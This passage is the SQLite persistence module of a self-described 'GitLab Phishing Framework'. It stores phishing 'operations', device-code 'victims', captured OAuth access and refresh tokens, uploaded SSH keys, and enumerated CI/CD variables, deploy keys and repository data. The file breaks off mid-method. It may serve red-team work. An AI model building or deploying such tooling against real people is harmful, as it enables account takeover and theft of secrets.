"""
Database layer for the GitLab Phishing Framework.
Handles all data persistence using SQLite.
"""

import sqlite3
import json
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
from contextlib import contextmanager

from .models import (
    OperationPhase
)


logger = logging.getLogger(__name__)


class Database:
    """Database manager for GitLab Phishing Framework."""
    
    def __init__(self, db_path: str = "data/gitlab_phishing.db"):
        """
        Initialize database connection.
        
        Args:
            db_path: Path to SQLite database file
        """
        self.db_path = db_path
        self._ensure_db_directory()
        self._init_schema()
        logger.info(f"Database initialized at {db_path}")
    
    def _ensure_db_directory(self):
        """Ensure the database directory exists."""
        db_dir = Path(self.db_path).parent
        db_dir.mkdir(parents=True, exist_ok=True)
    
    @contextmanager
    def _get_connection(self):
        """
        Context manager for database connections.
        
        Yields:
            sqlite3.Connection: Database connection
        """
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        try:
            yield conn
            conn.commit()
        except Exception as e:
            conn.rollback()
            logger.error(f"Database error: {e}")
            raise
        finally:
            conn.close()
    
    def _init_schema(self):
        """Initialize database schema if it doesn't exist."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            # Operations table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS operations (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL,
                    instance_type TEXT NOT NULL,
                    base_url TEXT NOT NULL,
                    client_id TEXT NOT NULL,
                    template TEXT,
                    scopes TEXT NOT NULL,
                    status TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    started_at TIMESTAMP,
                    stopped_at TIMESTAMP
                )
            """)
            
            # Victims table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS victims (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    operation_id INTEGER NOT NULL,
                    user_code TEXT NOT NULL,
                    device_code TEXT NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    status TEXT NOT NULL,
                    username TEXT,
                    email TEXT,
                    user_id INTEGER,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    authorized_at TIMESTAMP,
                    FOREIGN KEY (operation_id) REFERENCES operations(id)
                )
            """)
            
            # Tokens table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS tokens (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id INTEGER NOT NULL,
                    access_token TEXT NOT NULL,
                    refresh_token TEXT,
                    token_type TEXT DEFAULT 'Bearer',
                    scope TEXT,
                    expires_in INTEGER,
                    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (victim_id) REFERENCES victims(id)
                )
            """)
            
            # Projects table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS projects (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id INTEGER NOT NULL,
                    project_id INTEGER NOT NULL,
                    name TEXT NOT NULL,
                    path TEXT,
                    visibility TEXT,
                    namespace TEXT,
                    description TEXT,
                    web_url TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (victim_id) REFERENCES victims(id)
                )
            """)
            
            # CI/CD Variables table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS ci_variables (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    project_db_id INTEGER NOT NULL,
                    key TEXT NOT NULL,
                    value TEXT,
                    masked BOOLEAN,
                    protected BOOLEAN,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (project_db_id) REFERENCES projects(id)
                )
            """)
            
            # SSH Keys table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS ssh_keys (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id INTEGER NOT NULL,
                    key_title TEXT NOT NULL,
                    public_key TEXT NOT NULL,
                    private_key_path TEXT NOT NULL,
                    fingerprint TEXT,
                    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (victim_id) REFERENCES victims(id)
                )
            """)
            
            # Activity Log table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS activity_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    operation_id INTEGER NOT NULL,
                    event_type TEXT NOT NULL,
                    message TEXT NOT NULL,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (operation_id) REFERENCES operations(id)
                )
            """)
            
            # Groups table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS groups (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id INTEGER NOT NULL,
                    group_id INTEGER NOT NULL,
                    name TEXT NOT NULL,
                    path TEXT,
                    visibility TEXT,
                    description TEXT,
                    web_url TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (victim_id) REFERENCES victims(id)
                )
            """)
            
            # Group Members table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS group_members (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    group_db_id INTEGER NOT NULL,
                    user_id INTEGER NOT NULL,
                    username TEXT,
                    name TEXT,
                    access_level INTEGER,
                    access_level_name TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (group_db_id) REFERENCES groups(id)
                )
            """)
            
            # Project Members table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS project_members (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    project_db_id INTEGER NOT NULL,
                    user_id INTEGER NOT NULL,
                    username TEXT,
                    name TEXT,
                    access_level INTEGER,
                    access_level_name TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (project_db_id) REFERENCES projects(id)
                )
            """)
            
            # Merge Requests table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS merge_requests (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    project_db_id INTEGER NOT NULL,
                    mr_id INTEGER NOT NULL,
                    iid INTEGER NOT NULL,
                    title TEXT NOT NULL,
                    state TEXT,
                    author TEXT,
                    source_branch TEXT,
                    target_branch TEXT,
                    web_url TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (project_db_id) REFERENCES projects(id)
                )
            """)
            
            # Issues table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS issues (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    project_db_id INTEGER NOT NULL,
                    issue_id INTEGER NOT NULL,
                    iid INTEGER NOT NULL,
                    title TEXT NOT NULL,
                    state TEXT,
                    author TEXT,
                    labels TEXT,
                    web_url TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (project_db_id) REFERENCES projects(id)
                )
            """)
            
            # Snippets table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS snippets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id INTEGER NOT NULL,
                    snippet_id INTEGER NOT NULL,
                    title TEXT NOT NULL,
                    file_name TEXT,
                    visibility TEXT,
                    web_url TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (victim_id) REFERENCES victims(id)
                )
            """)
            
            # Deploy Keys table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS deploy_keys (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    project_db_id INTEGER NOT NULL,
                    key_id INTEGER NOT NULL,
                    title TEXT NOT NULL,
                    key TEXT NOT NULL,
                    can_push BOOLEAN,
                    created_at TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (project_db_id) REFERENCES projects(id)
                )
            """)
            
            # Webhooks table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS webhooks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    project_db_id INTEGER NOT NULL,
                    hook_id INTEGER NOT NULL,
                    url TEXT NOT NULL,
                    push_events BOOLEAN,
                    merge_requests_events BOOLEAN,
                    issues_events BOOLEAN,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (project_db_id) REFERENCES projects(id)
                )
            """)
            
            # Protected Branches table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS protected_branches (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    project_db_id INTEGER NOT NULL,
                    name TEXT NOT NULL,
                    push_access_levels TEXT,
                    merge_access_levels TEXT,
                    allow_force_push BOOLEAN,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (project_db_id) REFERENCES projects(id)
                )
            """)
            
            # Runners table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS runners (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    project_db_id INTEGER NOT NULL,
                    runner_id INTEGER NOT NULL,
                    description TEXT,
                    active BOOLEAN,
                    is_shared BOOLEAN,
                    runner_type TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (project_db_id) REFERENCES projects(id)
                )
            """)
            
            # Container Registry table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS container_registries (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    project_db_id INTEGER NOT NULL,
                    registry_id INTEGER NOT NULL,
                    name TEXT,
                    path TEXT,
                    location TEXT,
                    created_at TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (project_db_id) REFERENCES projects(id)
                )
            """)
            
            # Packages table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS packages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    project_db_id INTEGER NOT NULL,
                    package_id INTEGER NOT NULL,
                    name TEXT NOT NULL,
                    version TEXT,
                    package_type TEXT,
                    created_at TEXT,
                    discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (project_db_id) REFERENCES projects(id)
                )
            """)
            
            conn.commit()
            logger.debug("Database schema initialized")

    # ==================== OPERATIONS CRUD ====================
    
    def create_operation(self, name: str, instance_type: str, base_url: str,
                        client_id: str, template: Optional[str], 
                        scopes: List[str]) -> int:
        """
        Create a new operation.
        
        Args:
            name: Operation name
            instance_type: 'saas' or 'self-managed'
            base_url: GitLab instance base URL
            client_id: OAuth application client ID
            template: Template name (optional)
            scopes: List of OAuth scopes
            
        Returns:
            ID of created operation
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO operations (name, instance_type, base_url, client_id, 
                                      template, scopes, status)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (name, instance_type, base_url, client_id, template, 
                  json.dumps(scopes), OperationPhase.CREATED.value))
            
            operation_id = cursor.lastrowid
            logger.info(f"Created operation {operation_id}: {name}")
            
            # Log activity in same transaction
            cursor.execute("""
                INSERT INTO activity_log (operation_id, event_type, message)
                VALUES (?, ?, ?)
            """, (operation_id, "operation_created", 
                  f"Operation '{name}' created for {base_url}"))
            
            return operation_id
    
    def update_operation_status(self, operation_id: int, status: str,
                               started_at: Optional[datetime] = None,
                               stopped_at: Optional[datetime] = None) -> None:
        """
        Update operation status.
        
        Args:
            operation_id: ID of the operation
            status: New status value
            started_at: Start timestamp (optional)
            stopped_at: Stop timestamp (optional)
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            if started_at:
                cursor.execute("""
                    UPDATE operations 
                    SET status = ?, started_at = ?
                    WHERE id = ?
                """, (status, started_at, operation_id))
            elif stopped_at:
                cursor.execute("""
                    UPDATE operations 
                    SET status = ?, stopped_at = ?
                    WHERE id = ?
                """, (status, stopped_at, operation_id))
            else:
                cursor.execute("""
                    UPDATE operations 
                    SET status = ?
                    WHERE id = ?
                """, (status, operation_id))
            
            logger.debug(f"Updated operation {operation_id} status to {status}")
    
    def get_operation(self, operation_id: int) -> Optional[Dict[str, Any]]:
        """
        Get operation by ID.
        
        Args:
            operation_id: ID of the operation
            
        Returns:
            Dictionary with operation data or None if not found
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM operations WHERE id = ?
            """, (operation_id,))
            
            row = cursor.fetchone()
            if row:
                return self._row_to_dict(row, parse_scopes=True)
            return None
    
    def get_all_operations(self) -> List[Dict[str, Any]]:
        """
        Get all operations.
        
        Returns:
            List of operation dictionaries
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM operations ORDER BY created_at DESC
            """)
            
            return [self._row_to_dict(row, parse_scopes=True) 
                   for row in cursor.fetchall()]
    

    def reset_database(self) -> None:
        """
        Reset the entire database by deleting all data from all tables.
        
        This is a destructive operation that cannot be undone.
        All operations, victims, tokens, projects, SSH keys, and activity logs will be deleted.
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            # Delete all data from all tables in reverse order of dependencies
            cursor.execute("DELETE FROM ssh_keys")
            cursor.execute("DELETE FROM ci_variables")
            cursor.execute("DELETE FROM projects")
            cursor.execute("DELETE FROM tokens")
            cursor.execute("DELETE FROM victims")
            cursor.execute("DELETE FROM activity_log")
            cursor.execute("DELETE FROM operations")
            
            # Reset auto-increment counters
            cursor.execute("DELETE FROM sqlite_sequence")
            
            logger.warning("Database has been reset - all data deleted")
    
    # ==================== VICTIMS CRUD ====================
    
    def add_victim(self, operation_id: int, user_code: str, device_code: str,
                  ip_address: Optional[str] = None, 
                  user_agent: Optional[str] = None) -> int:
        """
        Add a new victim.
        
        Args:
            operation_id: ID of the operation
            user_code: User code from device flow
            device_code: Device code from device flow
            ip_address: Victim's IP address (optional)
            user_agent: Victim's user agent (optional)
            
        Returns:
            ID of created victim
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO victims (operation_id, user_code, device_code, 
                                   ip_address, user_agent, status)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (operation_id, user_code, device_code, ip_address, 
                  user_agent, "pending"))
            
            victim_id = cursor.lastrowid
            logger.info(f"Added victim {victim_id} to operation {operation_id}")
            
            # Log activity in same transaction
            cursor.execute("""
                INSERT INTO activity_log (operation_id, event_type, message)
                VALUES (?, ?, ?)
            """, (operation_id, "victim_added", 
                  f"New victim with code {user_code}"))
            
            return victim_id
    
    def update_victim_status(self, victim_id: int, status: str,
                           authorized_at: Optional[datetime] = None) -> None:
        """
        Update victim status.
        
        Args:
            victim_id: ID of the victim
            status: New status value
            authorized_at: Authorization timestamp (optional)
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            if authorized_at:
                cursor.execute("""
                    UPDATE victims 
                    SET status = ?, authorized_at = ?
                    WHERE id = ?
                """, (status, authorized_at, victim_id))
            else:
                cursor.execute("""
                    UPDATE victims 
                    SET status = ?
                    WHERE id = ?
                """, (status, victim_id))
            
            logger.debug(f"Updated victim {victim_id} status to {status}")
    
    def update_victim_info(self, victim_id: int, username: Optional[str] = None,
                          email: Optional[str] = None, 
                          user_id: Optional[int] = None) -> None:
        """
        Update victim information after enumeration.
        
        Args:
            victim_id: ID of the victim
            username: GitLab username (optional)
            email: Email address (optional)
            user_id: GitLab user ID (optional)
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            updates = []
            params = []
            
            if username is not None:
                updates.append("username = ?")
                params.append(username)
            if email is not None:
                updates.append("email = ?")
                params.append(email)
            if user_id is not None:
                updates.append("user_id = ?")
                params.append(user_id)
            
            if updates:
                params.append(victim_id)
                query = f"UPDATE victims SET {', '.join(updates)} WHERE id = ?"
                cursor.execute(query, params)
                logger.debug(f"Updated victim {victim_id} information")
    
    def get_victim(self, victim_id: int) -> Optional[Dict[str, Any]]:
        """
        Get victim by ID.
        
        Args:
            victim_id: ID of the victim
            
        Returns:
            Dictionary with victim data or None if not found
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM victims WHERE id = ?
            """, (victim_id,))
            
            row = cursor.fetchone()
            if row:
                return self._row_to_dict(row)
            return None
    
    def get_victims(self, operation_id: Optional[int] = None) -> List[Dict[str, Any]]:
        """
        Get all victims, optionally filtered by operation.
        
        Args:
            operation_id: Filter by operation ID (optional)
            
        Returns:
            List of victim dictionaries
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            if operation_id:
                cursor.execute("""
                    SELECT * FROM victims 
                    WHERE operation_id = ?
                    ORDER BY created_at DESC
                """, (operation_id,))
            else:
                cursor.execute("""
                    SELECT * FROM victims ORDER BY created_at DESC
                """)
            
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== TOKENS CRUD ====================
    
    def store_token(self, victim_id: int, access_token: str, 
                   refresh_token: Optional[str] = None,
                   scope: Optional[str] = None,
                   expires_in: Optional[int] = None) -> int:
        """
        Store a captured access token.
        
        Args:
            victim_id: ID of the victim
            access_token: OAuth access token
            refresh_token: OAuth refresh token (optional)
            scope: Token scope (optional)
            expires_in: Token expiration time in seconds (optional)
            
        Returns:
            ID of created token record
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO tokens (victim_id, access_token, refresh_token, scope, expires_in)
                VALUES (?, ?, ?, ?, ?)
            """, (victim_id, access_token, refresh_token, scope, expires_in))
            
            token_id = cursor.lastrowid
            logger.info(f"Stored token {token_id} for victim {victim_id} (has refresh_token: {refresh_token is not None})")
            
            # Get operation_id for logging
            cursor.execute("""
                SELECT operation_id FROM victims WHERE id = ?
            """, (victim_id,))
            operation_id = cursor.fetchone()[0]
            
            # Log activity in same transaction
            cursor.execute("""
                INSERT INTO activity_log (operation_id, event_type, message)
                VALUES (?, ?, ?)
            """, (operation_id, "token_captured", 
                  f"Token captured for victim {victim_id}"))
            
            return token_id
    
    def get_token(self, victim_id: int) -> Optional[Dict[str, Any]]:
        """
        Get token for a victim.
        
        Args:
            victim_id: ID of the victim
            
        Returns:
            Dictionary with token data or None if not found
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM tokens WHERE victim_id = ?
            """, (victim_id,))
            
            row = cursor.fetchone()
            if row:
                return self._row_to_dict(row)
            return None
    
    # ==================== PROJECTS CRUD ====================
    
    def store_project(self, victim_id: int, project_data: Dict[str, Any]) -> int:
        """
        Store a discovered project.
        
        Args:
            victim_id: ID of the victim
            project_data: Dictionary with project information
            
        Returns:
            ID of created project record
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO projects (victim_id, project_id, name, path, 
                                    visibility, namespace, description, web_url)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                victim_id,
                project_data.get('id'),
                project_data.get('name'),
                project_data.get('path'),
                project_data.get('visibility'),
                project_data.get('namespace', {}).get('full_path') if isinstance(project_data.get('namespace'), dict) else project_data.get('namespace'),
                project_data.get('description'),
                project_data.get('web_url')
            ))
            
            project_id = cursor.lastrowid
            logger.debug(f"Stored project {project_id} for victim {victim_id}")
            
            return project_id
    
    def get_projects(self, victim_id: int) -> List[Dict[str, Any]]:
        """
        Get all projects for a victim.
        
        Args:
            victim_id: ID of the victim
            
        Returns:
            List of project dictionaries
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM projects 
                WHERE victim_id = ?
                ORDER BY discovered_at DESC
            """, (victim_id,))
            
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== CI/CD VARIABLES CRUD ====================
    
    def store_ci_variable(self, project_db_id: int, key: str, 
                         value: Optional[str] = None,
                         masked: bool = False, 
                         protected: bool = False) -> int:
        """
        Store a CI/CD variable.
        
        Args:
            project_db_id: ID of the project (internal DB ID from projects table)
            key: Variable key
            value: Variable value (optional, may be masked)
            masked: Whether variable is masked
            protected: Whether variable is protected
            
        Returns:
            ID of created variable record
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO ci_variables (project_db_id, key, value, masked, protected)
                VALUES (?, ?, ?, ?, ?)
            """, (project_db_id, key, value, masked, protected))
            
            variable_id = cursor.lastrowid
            logger.debug(f"Stored CI variable {variable_id} for project {project_db_id}")
            
            return variable_id
    
    def get_ci_variables(self, project_db_id: int) -> List[Dict[str, Any]]:
        """
        Get all CI/CD variables for a project.
        
        Args:
            project_db_id: ID of the project (internal DB ID from projects table)
            
        Returns:
            List of variable dictionaries
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM ci_variables 
                WHERE project_db_id = ?
                ORDER BY discovered_at DESC
            """, (project_db_id,))
            
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    

    
    # ==================== ACTIVITY LOG CRUD ====================
    
    def log_activity(self, operation_id: int, event_type: str, 
                    message: str) -> int:
        """
        Log an activity event.
        
        Args:
            operation_id: ID of the operation
            event_type: Type of event
            message: Event message
            
        Returns:
            ID of created log entry
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO activity_log (operation_id, event_type, message)
                VALUES (?, ?, ?)
            """, (operation_id, event_type, message))
            
            log_id = cursor.lastrowid
            logger.debug(f"Logged activity: {event_type} - {message}")
            
            return log_id
    
    def get_activity_log(self, operation_id: int, 
                        limit: Optional[int] = None) -> List[Dict[str, Any]]:
        """
        Get activity log for an operation.
        
        Args:
            operation_id: ID of the operation
            limit: Maximum number of entries to return (optional)
            
        Returns:
            List of activity log dictionaries
        """
        with self._get_connection() as conn:
            cursor = conn.cursor()
            
            if limit:
                cursor.execute("""
                    SELECT * FROM activity_log 
                    WHERE operation_id = ?
                    ORDER BY timestamp DESC
                    LIMIT ?
                """, (operation_id, limit))
            else:
                cursor.execute("""
                    SELECT * FROM activity_log 
                    WHERE operation_id = ?
                    ORDER BY timestamp DESC
                """, (operation_id,))
            
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== GROUPS CRUD ====================
    
    def store_group(self, victim_id: int, group_data: Dict[str, Any]) -> int:
        """Store a discovered group."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO groups (victim_id, group_id, name, path, 
                                   visibility, description, web_url)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (
                victim_id,
                group_data.get('id'),
                group_data.get('name'),
                group_data.get('path'),
                group_data.get('visibility'),
                group_data.get('description'),
                group_data.get('web_url')
            ))
            return cursor.lastrowid
    
    def get_groups(self, victim_id: int) -> List[Dict[str, Any]]:
        """Get all groups for a victim."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM groups 
                WHERE victim_id = ?
                ORDER BY discovered_at DESC
            """, (victim_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== GROUP MEMBERS CRUD ====================
    
    def store_group_member(self, group_db_id: int, member_data: Dict[str, Any]) -> int:
        """Store a group member."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO group_members (group_db_id, user_id, username, name, 
                                          access_level, access_level_name)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                group_db_id,
                member_data.get('id'),
                member_data.get('username'),
                member_data.get('name'),
                member_data.get('access_level'),
                self._get_access_level_name(member_data.get('access_level'))
            ))
            return cursor.lastrowid
    
    def get_group_members(self, group_db_id: int) -> List[Dict[str, Any]]:
        """Get all members for a group."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM group_members 
                WHERE group_db_id = ?
                ORDER BY access_level DESC
            """, (group_db_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== PROJECT MEMBERS CRUD ====================
    
    def store_project_member(self, project_db_id: int, member_data: Dict[str, Any]) -> int:
        """Store a project member."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO project_members (project_db_id, user_id, username, name, 
                                            access_level, access_level_name)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                project_db_id,
                member_data.get('id'),
                member_data.get('username'),
                member_data.get('name'),
                member_data.get('access_level'),
                self._get_access_level_name(member_data.get('access_level'))
            ))
            return cursor.lastrowid
    
    def get_project_members(self, project_db_id: int) -> List[Dict[str, Any]]:
        """Get all members for a project."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM project_members 
                WHERE project_db_id = ?
                ORDER BY access_level DESC
            """, (project_db_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== MERGE REQUESTS CRUD ====================
    
    def store_merge_request(self, project_db_id: int, mr_data: Dict[str, Any]) -> int:
        """Store a merge request."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            author = mr_data.get('author', {})
            cursor.execute("""
                INSERT INTO merge_requests (project_db_id, mr_id, iid, title, state, 
                                           author, source_branch, target_branch, web_url)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                project_db_id,
                mr_data.get('id'),
                mr_data.get('iid'),
                mr_data.get('title'),
                mr_data.get('state'),
                author.get('username') if isinstance(author, dict) else None,
                mr_data.get('source_branch'),
                mr_data.get('target_branch'),
                mr_data.get('web_url')
            ))
            return cursor.lastrowid
    
    def get_merge_requests(self, project_db_id: int) -> List[Dict[str, Any]]:
        """Get all merge requests for a project."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM merge_requests 
                WHERE project_db_id = ?
                ORDER BY discovered_at DESC
            """, (project_db_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== ISSUES CRUD ====================
    
    def store_issue(self, project_db_id: int, issue_data: Dict[str, Any]) -> int:
        """Store an issue."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            author = issue_data.get('author', {})
            labels = issue_data.get('labels', [])
            cursor.execute("""
                INSERT INTO issues (project_db_id, issue_id, iid, title, state, 
                                   author, labels, web_url)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                project_db_id,
                issue_data.get('id'),
                issue_data.get('iid'),
                issue_data.get('title'),
                issue_data.get('state'),
                author.get('username') if isinstance(author, dict) else None,
                json.dumps(labels) if labels else None,
                issue_data.get('web_url')
            ))
            return cursor.lastrowid
    
    def get_issues(self, project_db_id: int) -> List[Dict[str, Any]]:
        """Get all issues for a project."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM issues 
                WHERE project_db_id = ?
                ORDER BY discovered_at DESC
            """, (project_db_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== SNIPPETS CRUD ====================
    
    def store_snippet(self, victim_id: int, snippet_data: Dict[str, Any]) -> int:
        """Store a snippet."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO snippets (victim_id, snippet_id, title, file_name, 
                                     visibility, web_url)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                victim_id,
                snippet_data.get('id'),
                snippet_data.get('title'),
                snippet_data.get('file_name'),
                snippet_data.get('visibility'),
                snippet_data.get('web_url')
            ))
            return cursor.lastrowid
    
    def get_snippets(self, victim_id: int) -> List[Dict[str, Any]]:
        """Get all snippets for a victim."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM snippets 
                WHERE victim_id = ?
                ORDER BY discovered_at DESC
            """, (victim_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== DEPLOY KEYS CRUD ====================
    
    def store_deploy_key(self, project_db_id: int, key_data: Dict[str, Any]) -> int:
        """Store a deploy key."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO deploy_keys (project_db_id, key_id, title, key, 
                                        can_push, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                project_db_id,
                key_data.get('id'),
                key_data.get('title'),
                key_data.get('key'),
                key_data.get('can_push', False),
                key_data.get('created_at')
            ))
            return cursor.lastrowid
    
    def get_deploy_keys(self, project_db_id: int) -> List[Dict[str, Any]]:
        """Get all deploy keys for a project."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM deploy_keys 
                WHERE project_db_id = ?
                ORDER BY discovered_at DESC
            """, (project_db_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== WEBHOOKS CRUD ====================
    
    def store_webhook(self, project_db_id: int, hook_data: Dict[str, Any]) -> int:
        """Store a webhook."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO webhooks (project_db_id, hook_id, url, push_events, 
                                     merge_requests_events, issues_events)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                project_db_id,
                hook_data.get('id'),
                hook_data.get('url'),
                hook_data.get('push_events', False),
                hook_data.get('merge_requests_events', False),
                hook_data.get('issues_events', False)
            ))
            return cursor.lastrowid
    
    def get_webhooks(self, project_db_id: int) -> List[Dict[str, Any]]:
        """Get all webhooks for a project."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT * FROM webhooks 
                WHERE project_db_id = ?
                ORDER BY discovered_at DESC
            """, (project_db_id,))
            return [self._row_to_dict(row) for row in cursor.fetchall()]
    
    # ==================== PROTECTED BRANCHES CRUD ====================
    
    def store_protected_branch(self, project_db_id: int, branch_data: Dict[str, Any]) -> int:
        """Store a protected branch."""
        with self._get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
